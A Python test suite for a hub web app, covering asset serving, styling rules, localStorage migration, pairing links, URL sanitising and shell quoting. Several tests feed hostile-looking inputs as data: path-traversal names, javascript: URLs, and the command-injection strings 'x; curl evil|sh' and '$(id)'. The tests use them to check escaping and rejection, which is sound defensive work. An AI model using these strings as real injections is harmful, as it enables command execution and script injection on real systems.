"""The web app on the hub: /app/ pages and /v1/app/* data."""

import json
import re
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from swe.webapp import static
from swe.webapp.api import WebApp

from tests.test_remote_hub import HubBase


class TestAssetNames(unittest.TestCase):
    def test_only_flat_known_files(self):
        self.assertTrue(static.is_asset_name("index.html"))
        self.assertTrue(static.is_asset_name("harness-claude-color.svg"))
        for bad in ("../hub.py", "..", "a/b.js", "nope.js", "static.py", "", ".hidden.css"):
            self.assertFalse(static.is_asset_name(bad), bad)


class TestStyles(unittest.TestCase):
    """styles.css keeps one definition per component; tokens.css one dark palette."""

    STATIC = Path(static.__file__).parent / "static"

    @staticmethod
    def _tokens(block):
        return dict(re.findall(r"(--[\w-]+):\s*([^;]+);", block))

    def test_both_dark_blocks_define_the_same_tokens(self):
        css = (self.STATIC / "tokens.css").read_text()
        auto = css.split("@media (prefers-color-scheme: dark) {")[1].split("\n}\n")[0]
        explicit = css.split(':root[data-theme="dark"] {')[1].split("\n}\n")[0]
        auto_tokens, explicit_tokens = self._tokens(auto), self._tokens(explicit)
        self.assertGreater(len(explicit_tokens), 30)
        self.assertEqual(auto_tokens, explicit_tokens)

    def test_pages_borrow_spinner_switch_and_button_instead_of_copying_them(self):
        for sheet in sorted((self.STATIC / "pages").glob("*.css")):
            css = re.sub(r"/\*.*?\*/", "", sheet.read_text(), flags=re.S)
            self.assertNotIn("@keyframes spin", css, sheet.name)
            for rule in css.split("}"):
                with self.subTest(sheet=sheet.name, rule=rule.strip()[:60]):
                    # A ring that turns is .spinner; an inked button is .btn.primary.
                    self.assertFalse("border-radius: 50%" in rule and "animation: spin" in rule
                                     and "border-top-color" in rule)
                    self.assertFalse("background: var(--text-primary)" in rule
                                     and "color: var(--card)" in rule and "border-color: var(--text-primary)" in rule)
                    self.assertNotIn("translateX(16px)", rule)


class TestWebAppRoutes(HubBase):
    def setUp(self):
        super().setUp()
        self.srv.state.webapp = WebApp(self.srv.home, download_prices=False)
        proj = self.srv.home / ".claude" / "projects" / "p"
        proj.mkdir(parents=True)
        (proj / "a.jsonl").write_text(json.dumps({
            "timestamp": "2026-10-03T10:00:00Z", "sessionId": "s", "requestId": "r",
            "message": {"id": "m", "model": "claude-opus-5",
                        "usage": {"input_tokens": 1000, "output_tokens": 10}},
        }) + "\n")

    def test_pages_are_public_and_confined(self):
        status, body = self.srv.request("GET", "/")
        self.assertEqual(status, 200)
        self.assertIn(b'src="/app.js"', body)
        self.assertIn(b'src="/model-menu.js"', body)
        for path in ("/app.js", "/format.js", "/model-menu.js", "/machine-strip.js", "/styles.css",
                     "/harness-devin.svg"):
            self.assertEqual(self.srv.request("GET", path)[0], 200, path)
        # Only a flat asset name of a known type: nothing climbs out of
        # the folder, and a Python module beside it is never served.
        for path in ("/../hub.py", "/%2e%2e/hub.py", "/api.py", "/x/y.js", "/nope.js"):
            self.assertEqual(self.srv.request("GET", path)[0], 404, path)

    def test_overview_needs_a_device_and_reads_the_ledger(self):
        self.assertEqual(self.srv.request("GET", "/v1/app/overview")[0], 401)
        status, data = self.srv.request(
            "GET", "/v1/app/overview?period=all&tz=UTC", headers=self.auth())
        self.assertEqual(status, 200, data)
        body = json.loads(data)
        self.assertEqual(body["period"], "all")
        self.assertEqual(body["totals"]["tokens"], 1010)
        self.assertGreater(body["totals"]["cost_usd"], 0)
        self.assertEqual(body["harnesses"][0]["harness"], "claude")
        self.assertEqual(body["machine"], self.srv.state.machine["name"])
        self.assertEqual(body["notes"], [])
        # No shared AGENTS.md yet: Overview offers setup until there is one.
        self.assertTrue(body["first_run"])
        agents = self.srv.home / ".swe/AGENTS.md"
        agents.parent.mkdir(parents=True, exist_ok=True)
        agents.write_text("# shared\n")
        body = json.loads(self.srv.request(
            "GET", "/v1/app/overview?period=all&tz=UTC", headers=self.auth())[1])
        self.assertFalse(body["first_run"])
        # The store is the web app's own, never the Mac app's.
        self.assertTrue((self.srv.home / ".swe/data/web-ledger/ledger.sqlite").exists())
        self.assertFalse((self.srv.home / ".swe/data/ledger").exists())


APP_JS = Path(__file__).resolve().parents[1] / "src/swe/webapp/static/app.js"


MANAGE_JS = APP_JS.with_name("manage.js")


def app_js_function(name: str, js: Path = APP_JS) -> str:
    """The source of a top-level ``function name(...)`` in app.js (or
    ``js``, e.g. ``MANAGE_JS``), for node tests that run one page script
    with app.js's globals stubbed: a page calls the real helper, not a copy
    that could drift."""
    import re
    found = re.search(r"^(?:async )?function %s\(.*?^\}\n" % re.escape(name), js.read_text(encoding="utf-8"),
                      re.S | re.M)
    assert found, name
    return found.group(0)


class TestPriceDownload(unittest.TestCase):
    """The LiteLLM download must never run under the page lock."""

    def test_download_runs_off_the_page_lock(self):
        import threading
        from unittest.mock import patch

        from swe.webapp import api

        release = threading.Event()
        calls = []

        def load(home, download=True):
            calls.append(download)
            if download:
                release.wait(10)  # a slow LiteLLM fetch
                return "downloaded"
            return "on disk"

        app = WebApp(None, download_prices=True)
        app._store = object()
        app._scanned_at = float("inf")  # no scan
        try:
            with patch.object(api, "load_catalog", side_effect=load), \
                    patch.object(app, "_kick_feed"):
                with app._lock:
                    app._ensure(False)  # returns before the download
                self.assertEqual(app._catalog, "on disk")
                self.assertTrue(app._lock.acquire(timeout=1))
                app._lock.release()
                release.set()
                app._prices_thread.join(5)
            self.assertEqual(app._catalog, "downloaded")
            self.assertEqual(calls, [False, True])
        finally:
            release.set()

    def test_without_downloads_the_disk_copy_still_reloads_hourly(self):
        from unittest.mock import patch

        from swe.webapp import api

        app = WebApp(None, download_prices=False)
        app._store = object()
        app._scanned_at = float("inf")
        with patch.object(api, "load_catalog", side_effect=["old", "new"]), \
                patch.object(app, "_kick_feed"):
            app._ensure(False)
            self.assertEqual(app._catalog, "old")
            app._catalog_at -= api.CATALOG_TTL_S + 1
            app._ensure(False)
        self.assertEqual(app._catalog, "new")

    def test_a_pricing_write_beats_an_older_download(self):
        from unittest.mock import patch

        from swe.webapp import api

        app = WebApp(None, download_prices=True)
        gen = app._prices_gen
        app.prices_changed()
        with patch.object(api, "load_catalog", return_value="stale"):
            app._refresh_prices(gen)
        self.assertIsNone(app._catalog)


class TestSessionUsage(unittest.TestCase):
    """by_session groups the whole ledger: once per scan and price list."""

    def test_reused_until_the_next_scan_or_prices(self):
        from unittest.mock import patch

        from swe.webapp import api

        app = WebApp(None, download_prices=False)
        app._store, app._catalog, app._scanned_at = object(), object(), 1.0
        with patch.object(api, "by_session", side_effect=lambda s, c: {}) as grp:
            app.session_usage()
            app.session_usage()
            self.assertEqual(grp.call_count, 1)
            app._scanned_at = 2.0
            app.session_usage()
            app._catalog = object()
            app.session_usage()
            self.assertEqual(grp.call_count, 3)

    def test_a_feed_round_drops_the_cached_usage(self):
        # The Cursor feed writes usage rows without a scan: the next
        # read must group again.
        from unittest.mock import patch

        from swe.webapp import api

        app = WebApp(None, download_prices=False)
        app._store, app._catalog, app._scanned_at = object(), object(), 1.0
        with patch.object(api, "by_session", side_effect=lambda s, c: {}) as grp, \
                patch.object(api, "LedgerStore"), patch.object(api.feed, "poll"):
            app.session_usage()
            app._poll_feed()
            app.session_usage()
        self.assertEqual(grp.call_count, 2)


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestStorageKeyMigration(unittest.TestCase):
    """migrateStorageKeys: the quiver.* keys a browser kept before the
    rename move to swe.* once, and the old keys go."""

    def migrate(self, stored, throw_on_set=False, then=""):
        src = 'const LEGACY_CREDENTIAL_KEY = "quiver.remote";\n' + app_js_function("migrateStorageKeys") + """
const m = new Map(Object.entries(%s));
const store = {
  get length() { return m.size; },
  key(i) { return [...m.keys()][i] ?? null; },
  getItem(k) { return m.has(k) ? m.get(k) : null; },
  setItem(k, v) { if (%s) throw new Error("quota"); m.set(k, String(v)); },
  removeItem(k) { m.delete(k); },
};
try { migrateStorageKeys(store); } catch { }
const localStorage = store;
%s
process.stdout.write(JSON.stringify(Object.fromEntries(m)));
""" % (json.dumps(stored), "true" if throw_on_set else "false", then)
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_old_keys_move_to_the_swe_names(self):
        got = self.migrate({"quiver.setup.offered": "1", "quiver.compute.range": "1h",
                            "quiver.appearance": "dark", "other": "kept"})
        self.assertEqual(got, {"swe.setup.offered": "1", "swe.compute.range": "1h",
                               "swe.appearance": "dark", "other": "kept"})

    def test_the_credential_is_copied_and_kept_for_older_tabs(self):
        # A tab still running a pre-rename page shares this storage and
        # reads quiver.remote, so the copy leaves it until a credential
        # is banked or forgotten.
        got = self.migrate({"quiver.remote": '{"credential":"c"}'})
        self.assertEqual(got, {"quiver.remote": '{"credential":"c"}', "swe.remote": '{"credential":"c"}'})
        self.assertEqual(self.migrate(got), got)
        stored = self.migrate(got, then=app_js_function("pairStore") + 'pairStore({ credential: "n" });')
        self.assertEqual(stored, {"swe.remote": '{"credential":"n"}'})
        forgot = self.migrate(got, then=app_js_function("pairForget") + "pairForget();")
        self.assertEqual(forgot, {})

    def test_a_value_already_under_the_new_name_wins(self):
        got = self.migrate({"quiver.appearance": "dark", "swe.appearance": "light"})
        self.assertEqual(got, {"swe.appearance": "light"})

    def test_a_second_load_changes_nothing(self):
        once = self.migrate({"quiver.setup.offered": "1"})
        self.assertEqual(self.migrate(once), once)

    def test_a_full_store_keeps_the_old_key_and_still_signs_in(self):
        # setItem throwing (quota) must not lose the value: the old key
        # stays, and credential() still finds it there.
        self.assertEqual(self.migrate({"quiver.appearance": "dark"}, throw_on_set=True), {"quiver.appearance": "dark"})
        cred = APP_JS.read_text(encoding="utf-8")
        start = cred.index("const credential = () => {")
        cred = cred[start:cred.index("};\n", start) + 3]
        got = self.migrate({"quiver.remote": '{"credential":"old"}'}, throw_on_set=True,
                           then=cred + 'm.set("seen", credential());')
        self.assertEqual(got, {"quiver.remote": '{"credential":"old"}', "seen": "old"})


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestSetupOffer(unittest.TestCase):
    """app.js's first-run offer, run under node with the browser stubbed:
    each case is a fresh page load at ``hash``."""

    def offer(self, hash_, body, stored=None, storage_throws=False):
        storage = ("{ getItem() { throw new Error('blocked'); }, setItem() { throw new Error('blocked'); } }"
                   if storage_throws else
                   "{ m: new Map(Object.entries(" + json.dumps(stored or {}) + ")),"
                   " getItem(k) { return this.m.has(k) ? this.m.get(k) : null; },"
                   " setItem(k, v) { this.m.set(k, String(v)); } }")
        prelude = (
            "const listeners = {};\n"
            "globalThis.window = { addEventListener(t, f) { (listeners[t] ||= []).push(f); } };\n"
            "globalThis.document = { addEventListener() {} };\n"
            "globalThis.location = { hash: " + json.dumps(hash_) + " };\n"
            "globalThis.localStorage = " + storage + ";\n"
            # Every listener but route(), which needs the page's DOM.
            "const fire = (t) => (listeners[t] || []).filter((f) => f !== route).forEach((f) => f());\n"
            # Pages app.js names that sessions.js and manage.js define.
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n")
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(prelude + APP_JS.read_text(encoding="utf-8")
                    + "\nprocess.stdout.write(JSON.stringify((() => {" + body + "})()));\n")
        self.addCleanup(Path(f.name).unlink)
        done = subprocess.run(["node", f.name], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    FIRST = "const d = { first_run: true };"
    RESULT = "({ went, hash: location.hash, offered: localStorage.getItem('swe.setup.offered') })"

    def test_a_bare_landing_opens_setup_once(self):
        out = self.offer("", self.FIRST + "const went = offerSetupOnce(d);"
                         " const again = offerSetupOnce(d); return { ...(" + self.RESULT + "), again };")
        self.assertEqual(out, {"went": True, "hash": "#/setup", "offered": "1", "again": False})

    def test_a_saved_offer_stays_on_overview(self):
        out = self.offer("", self.FIRST + "const went = offerSetupOnce(d); return " + self.RESULT + ";",
                         stored={"swe.setup.offered": "1"})
        self.assertEqual(out, {"went": False, "hash": "", "offered": "1"})

    def test_a_link_to_overview_is_not_redirected(self):
        for hash_ in ("#/overview", "#/overview?x=1"):
            out = self.offer(hash_, self.FIRST + "const went = offerSetupOnce(d); return " + self.RESULT + ";")
            self.assertEqual(out, {"went": False, "hash": hash_, "offered": None}, hash_)

    def test_leaving_before_overview_answers_spends_the_offer(self):
        out = self.offer("", self.FIRST + "location.hash = '#/sessions'; fire('hashchange');"
                         " const went = offerSetupOnce(d); return " + self.RESULT + ";")
        self.assertEqual(out, {"went": False, "hash": "#/sessions", "offered": None})

    def test_a_set_up_machine_or_blocked_storage_never_redirects(self):
        out = self.offer("", "const went = offerSetupOnce({ first_run: false }); return " + self.RESULT + ";")
        self.assertEqual(out, {"went": False, "hash": "", "offered": None})
        out = self.offer("", self.FIRST + "return { went: offerSetupOnce(d), hash: location.hash };",
                         storage_throws=True)
        self.assertEqual(out, {"went": False, "hash": ""})

    def test_overview_shows_the_card_only_on_first_run(self):
        out = self.offer("#/overview", "return [setupCard({ first_run: true, machine: '<b>box</b>' }),"
                         " setupCard({ first_run: false, machine: 'box' })];")
        self.assertIn('href="#/setup"', out[0])
        self.assertIn("Set up &lt;b&gt;box&lt;/b&gt;", out[0])
        self.assertEqual(out[1], "")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestDamagedPairLink(unittest.TestCase):
    """A #pair= link cut short mid-escape can't be decoded: route() shows
    the gate saying so, credential or not, instead of throwing on a blank
    page."""

    def panel_at(self, hash_):
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "const els = { sidebar: { innerHTML: '', querySelector: () => ({ outerHTML: '' }) } };\n"
            "globalThis.document = { addEventListener() {}, querySelectorAll: () => [],"
            " getElementById: (id) => (els[id] ||= { innerHTML: '' }) };\n"
            "globalThis.location = { hash: " + json.dumps(hash_) + " };\n"
            "globalThis.localStorage = { getItem() { return null; } };\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n"
            "const sessionsPage = { gen: 0 }, harnessesPage = { gen: 0 }, accountsPage = { gen: 0 };\n")
        body = "\nlet pairs = 0; pairExchange = () => { pairs++; }; route(); process.stdout.write(JSON.stringify([pairs, (els.panel || {}).innerHTML || '']));\n"
        done = subprocess.run(["node", "-e", prelude + APP_JS.read_text(encoding="utf-8") + body],
                              capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_the_gate_says_the_link_is_damaged(self):
        for hash_ in ("#pair=abc%", "#pair=abc&name=ph%E0%A4"):
            pairs, panel = self.panel_at(hash_)
            self.assertEqual(pairs, 0, hash_)
            self.assertIn("This pair link is damaged", panel, hash_)

    def test_a_refused_link_says_why_without_a_credential(self):
        """The real pairExchange, answered 410, in a browser with no stored
        credential: the gate shows the hub's reason, not the generic
        pairing line."""
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "const els = { sidebar: { innerHTML: '', querySelector: () => ({ outerHTML: '' }) } };\n"
            "globalThis.document = { addEventListener() {}, querySelectorAll: () => [],"
            " getElementById: (id) => (els[id] ||= { innerHTML: '' }) };\n"
            "globalThis.location = { hash: '' };\n"
            "globalThis.navigator = { userAgent: '' };\n"
            "globalThis.localStorage = { getItem() { return null; } };\n"
            "globalThis.fetch = async () => ({ status: 410, json: async () => ({ error: { message: 'That token was used.' } }) });\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n"
            "const sessionsPage = { gen: 0 }, harnessesPage = { gen: 0 }, accountsPage = { gen: 0 };\n")
        body = "\npairExchange('tok', '').then(() => process.stdout.write(els.panel.innerHTML));\n"
        done = subprocess.run(["node", "-e", prelude + APP_JS.read_text(encoding="utf-8") + body],
                              capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("The pair link didn&#39;t work: That token was used.", done.stdout)
        self.assertNotIn("needs pairing", done.stdout)

    def test_a_whole_link_still_pairs(self):
        self.assertEqual(self.panel_at("#pair=abc%2Bd&name=my%20phone")[0], 1)


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestMacOnlySidebar(unittest.TestCase):
    """app.js's sidebar and router for the Mac-only pages (Menu bar,
    Widgets), run under node with a two-element DOM stubbed."""

    def run_route(self, hash_):
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "globalThis.document = { addEventListener() {}, getElementById(id) { return els[id]; },"
            " querySelectorAll: () => [] };\n"
            "const els = { sidebar: { innerHTML: '', querySelector: () => ({ outerHTML: '<div class=\"brand\"></div>' }) },"
            " panel: { innerHTML: '' } };\n"
            "globalThis.location = { hash: " + json.dumps(hash_) + " };\n"
            "const replaced = [];\n"
            "globalThis.history = { replaceState(_s, _t, url) { replaced.push(url); location.hash = url; } };\n"
            "globalThis.localStorage = { getItem() { return null; }, setItem() {} };\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n"
            "const sessionsPage = { gen: 0 }, harnessesPage = { gen: 0 }, accountsPage = { gen: 0 };\n")
        body = ("const rendered = []; PAGES.overview = (id) => rendered.push(id);"
                " route(); return { rendered, replaced, hash: location.hash,"
                " sidebar: els.sidebar.innerHTML, panel: els.panel.innerHTML };")
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(prelude + APP_JS.read_text(encoding="utf-8")
                    + "\nprocess.stdout.write(JSON.stringify((() => {" + body + "})()));\n")
        self.addCleanup(Path(f.name).unlink)
        done = subprocess.run(["node", f.name], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_mac_only_items_wear_the_pill_and_are_not_links(self):
        sidebar = self.run_route("#/overview")["sidebar"]
        for page, label in (("menubar", "Menu bar"), ("widgets", "Widgets")):
            item = sidebar[sidebar.rindex('<span class="nav-item', 0, sidebar.index(f"<span>{label}</span>")):]
            item = item[:item.index("Mac app only</span></span>")]
            self.assertTrue(item.startswith('<span class="nav-item soon mac-only" data-page="%s" aria-disabled="true">' % page), item)
            self.assertNotIn("href", item)
            self.assertIn('<span class="badge mac-only">', item)
        self.assertNotIn('href="#/menubar"', sidebar)
        self.assertNotIn('href="#/widgets"', sidebar)
        # A page that isn't ported yet is still a link. Every row carries
        # data-page, which Settings' hide switches select on.
        self.assertIn('data-page="status" href="#/status"', sidebar)
        self.assertEqual(sidebar.count("data-page="), sidebar.count('class="nav-item'))

    def test_a_mac_only_hash_opens_overview(self):
        for hash_ in ("#/menubar", "#/widgets", "#widgets", "#/menubar?x=1"):
            out = self.run_route(hash_)
            self.assertEqual(out["rendered"], ["overview"], hash_)
            self.assertEqual(out["replaced"], ["#/overview"], hash_)
            self.assertIn('aria-current="page"', out["sidebar"])
            self.assertIn('class="nav-item active " data-page="overview" href="#/overview"', out["sidebar"])
            self.assertNotIn("part of the Mac app", out["panel"])

    def test_other_hashes_are_left_alone(self):
        for hash_ in ("", "#/overview"):
            out = self.run_route(hash_)
            self.assertEqual((out["rendered"], out["replaced"]), (["overview"], []), hash_)



@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestBodySheets(unittest.TestCase):
    """bodySheet puts a page's sheet on document.body, once, so a #panel
    repaint can't remove it; route() closes it on every navigation."""

    def test_made_once_on_body_and_closed_by_any_route(self):
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "const body = [], panel = { innerHTML: '' }, stubs = {};\n"
            "const sidebar = { innerHTML: '', querySelector: () => ({ outerHTML: '' }) };\n"
            "globalThis.document = { addEventListener() {}, body: { appendChild: (el) => body.push(el) },\n"
            "  createElement: (tag) => ({ tag, dataset: {}, open: false, attrs: {},\n"
            "    setAttribute(k, v) { this.attrs[k] = v; }, showModal() { this.open = true; },\n"
            "    close() { this.open = false; this.closed = (this.closed || 0) + 1; } }),\n"
            "  getElementById: (id) => (id === 'panel' ? panel : id === 'sidebar' ? sidebar\n"
            "    : body.find((e) => e.id === id) || (id.startsWith('pair-') ? (stubs[id] ||= {}) : null)),\n"
            "  querySelectorAll: (sel) => (sel === 'dialog[data-route-sheet][open]'\n"
            "    ? body.filter((e) => 'routeSheet' in e.dataset && e.open) : []) };\n"
            "globalThis.location = { hash: '#/skills' };\n"
            "globalThis.localStorage = { getItem: () => null };\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n"
            "const sessionsPage = { gen: 0 }, harnessesPage = { gen: 0 }, accountsPage = { gen: 0 };\n")
        body = (
            "PAGES.skills = () => {};\n"
            "const a = bodySheet('sk-new-sheet', 'sheet sk-new-sheet', 'New skill');\n"
            "const again = bodySheet('sk-new-sheet', 'other') === a;\n"
            "const idle = bodySheet('sk-sheet', 'sheet');\n"
            "a.showModal(); route();\n"
            "idle.showModal(); renderGate('Revoked.');\n"
            "process.stdout.write(JSON.stringify({ count: body.length, again, cls: a.className,\n"
            "  label: a.attrs['aria-label'], open: a.open, closed: a.closed, idleClosed: idle.closed || 0,\n"
            "  gateClosed: !idle.open }));\n")
        done = subprocess.run(["node", "-e", prelude + APP_JS.read_text(encoding="utf-8") + "\n" + body],
                              capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual(json.loads(done.stdout), {"count": 2, "again": True, "cls": "sheet sk-new-sheet",
                                                   "label": "New skill", "open": False, "closed": 1,
                                                   "idleClosed": 1, "gateClosed": True})

    # The two checks below read page source: a page builds its sheet inside
    # a render closure that only runs with the whole app around it, so
    # there is no seam to run it under node. They match the ways a dialog
    # can be made (markup in any case, createElement with any quote) and a
    # hashchange listener with any quote, so a reformat can't slip past.
    MADE_DIALOG = re.compile(r"<dialog\b|createElement\(\s*[\"'`]dialog[\"'`]\s*\)", re.I)
    OWN_HASHCHANGE = re.compile(r"[\"'`]hashchange[\"'`]")

    def test_pages_keep_no_sheet_inside_the_panel(self):
        """Skills and Plugins used to draw their sheets into #panel, where a
        repaint deleted them; Plugins reopened its sheet on a later visit."""
        for page in ("skills", "plugins", "hooks"):
            src = (APP_JS.parent / "pages" / f"{page}.js").read_text(encoding="utf-8")
            self.assertIsNone(self.MADE_DIALOG.search(src), page)

    def test_body_sheets_go_through_bodySheet(self):
        """Compute, Pricing and Service status kept sheets on document.body
        that route() never closed: Compute's stayed modal over the next
        page, and the other two each carried their own hashchange copy."""
        for page in ("compute", "pricing", "status"):
            src = (APP_JS.parent / "pages" / f"{page}.js").read_text(encoding="utf-8")
            self.assertRegex(src, r"\bbodySheet\(", page)
            self.assertIsNone(self.MADE_DIALOG.search(src), page)
            self.assertIsNone(self.OWN_HASHCHANGE.search(src), page)



@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestGateLead(unittest.TestCase):
    """renderGate's lead line: the refusal message only while a credential
    is stored, unless the caller keeps it (Settings after "Revoke this
    browser", which has just dropped the credential)."""

    def lead(self, call, stored):
        prelude = (
            "globalThis.window = { addEventListener() {} };\n"
            "const els = {};\n"
            "globalThis.document = { addEventListener() {}, querySelectorAll: () => [],"
            " getElementById: (id) => (els[id] ||= { innerHTML: '' }) };\n"
            "globalThis.location = { hash: '' };\n"
            "globalThis.localStorage = { getItem: () => " + json.dumps(stored) + " };\n"
            "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n")
        src = (prelude + APP_JS.read_text(encoding="utf-8") + "\n" + call
               + ";\nprocess.stdout.write(els.panel.innerHTML.match(/<p>([^<]*)<\\/p>/)[1]);\n")
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return done.stdout

    def test_lead(self):
        cred = json.dumps({"credential": "c"})
        self.assertEqual(self.lead('renderGate("Revoked.")', cred), "Revoked.")
        self.assertIn("needs pairing", self.lead('renderGate("Revoked.")', None))
        self.assertEqual(self.lead('renderGate("Signed out.", true)', None), "Signed out.")

@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestSafeHref(unittest.TestCase):
    """safeHref: a URL that came from GitHub, a tracker, a status feed or
    a plugin's manifest becomes a link only when it is http(s) or mailto,
    so a ``javascript:`` one can't run in the app's origin on a click."""

    def hrefs(self, urls):
        prelude = ("globalThis.window = { addEventListener() {} };\n"
                   "globalThis.document = { addEventListener() {} };\n"
                   "globalThis.location = { hash: '' };\n"
                   "function renderSessions() {} function renderHarnesses() {} function renderAccounts() {}\n")
        src = (prelude + APP_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify(" + json.dumps(urls) + ".map(safeHref)));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_web_and_mail_links_pass_escaped(self):
        self.assertEqual(self.hrefs(["https://github.com/a/b/pull/1", " HTTP://x.dev/?a=1&b=\"2\"", "mailto:me@x.dev"]),
                         ["https://github.com/a/b/pull/1", "HTTP://x.dev/?a=1&amp;b=&quot;2&quot;", "mailto:me@x.dev"])

    def test_script_and_other_schemes_are_dropped(self):
        self.assertEqual(self.hrefs(["javascript:alert(1)", " JavaScript:alert(1)", "java\tscript:alert(1)",
                                     "data:text/html,<b>x", "vbscript:x", "//evil.dev", "", None]),
                         [""] * 8)

    def test_pages_link_outside_urls_only_through_it(self):
        """No page builds an href from server data with plain esc(); the
        one esc() href left is Hooks' own in-app route. A source scan:
        every page's markup is a template literal, so this is the one
        place all of them can be checked at once. It allows either quote
        and spaces inside the ``${ }``."""
        static = APP_JS.parent
        esc_href = re.compile(r"""href\s*=\s*["']\$\{\s*esc\(""")
        hits = [f"{p.name}:{n}" for p in sorted([*static.glob("*.js"), *static.glob("pages/*.js")])
                for n, line in enumerate(p.read_text(encoding="utf-8").splitlines(), 1)
                if esc_href.search(line)]
        self.assertEqual([h.split(":")[0] for h in hits], ["hooks.js"], hits)


FORMAT_JS = APP_JS.with_name("format.js")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestShellWord(unittest.TestCase):
    """Fmt.shellWord: the attach and resume lines people paste into a
    shell quote anything that isn't a plain word."""

    def word(self, value):
        src = (FORMAT_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify(Fmt.shellWord("
               + json.dumps(value) + ")));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True,
                              text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_plain_words_stay_bare(self):
        for value in ("qv-0123abcd", "claude", "/a/b-c.d", "--resume=x"):
            self.assertEqual(self.word(value), value)

    def test_shell_syntax_is_single_quoted(self):
        self.assertEqual(self.word("x; curl evil|sh"), "'x; curl evil|sh'")
        self.assertEqual(self.word("$(id)"), "'$(id)'")
        self.assertEqual(self.word("it's"), "'it'\\''s'")
        self.assertEqual(self.word(""), "''")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestSessionStatus(unittest.TestCase):
    """Fmt.sessionStatus: the task page's session rows say the chat
    badge's words for the hub's statuses, not the raw value."""

    def status(self, value):
        src = (FORMAT_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify(Fmt.sessionStatus("
               + json.dumps(value) + ")));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True,
                              text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_known_statuses_read_as_words(self):
        self.assertEqual(self.status("approval"), "Approval needed")
        self.assertEqual(self.status("followup"), "Waiting")
        self.assertEqual(self.status("active"), "Active")

    def test_unknown_or_missing_status(self):
        self.assertEqual(self.status("idle"), "idle")
        self.assertEqual(self.status(None), "")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestHarnessColor(unittest.TestCase):
    """Fmt.harnessColor: a hand-picked colour, else the palette slot the
    Mac's HarnessColor.stableIndex and iOS Theme.harnessHex pick (64-bit
    FNV-1a over UTF-8), so an unlisted harness is one colour on every
    client. Their tests pin the same ids."""

    def colors(self, ids):
        src = (FORMAT_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify("
               + json.dumps(ids) + ".map((id) => Fmt.harnessColor(id))));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True,
                              text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_unlisted_harnesses_take_the_shared_palette_pick(self):
        self.assertEqual(
            self.colors(["claude", "made-up-harness", "aider", "amp", "zed", ""]),
            ["#d97757", "#f0755f", "#d9b44a", "#8ac74f", "#4ec9b0", "#f0755f"])

    def test_an_object_key_name_is_not_a_listed_harness(self):
        self.assertEqual(self.colors(["constructor"])[0][0], "#")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestResetIn(unittest.TestCase):
    """Fmt.resetIn: "in 12m", "in 4h 28m", "in 6d 13h" — two units, so a
    day-plus reset still shows the hours. The day count floors: 1d 30m
    reads "in 1d", never a decimal."""

    def reset_in(self, seconds):
        src = (FORMAT_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify(Fmt.resetIn(Date.now() / 1000 + "
               + json.dumps(seconds) + ")));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True,
                              text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_two_units_at_every_scale(self):
        self.assertEqual(self.reset_in(12 * 60), "in 12m")
        self.assertEqual(self.reset_in(20), "in 1m")
        self.assertEqual(self.reset_in(4 * 3600 + 28 * 60), "in 4h 28m")
        self.assertEqual(self.reset_in(3 * 3600), "in 3h")
        self.assertEqual(self.reset_in(30 * 3600), "in 1d 6h")
        self.assertEqual(self.reset_in(6 * 86400 + 13 * 3600 + 20), "in 6d 13h")

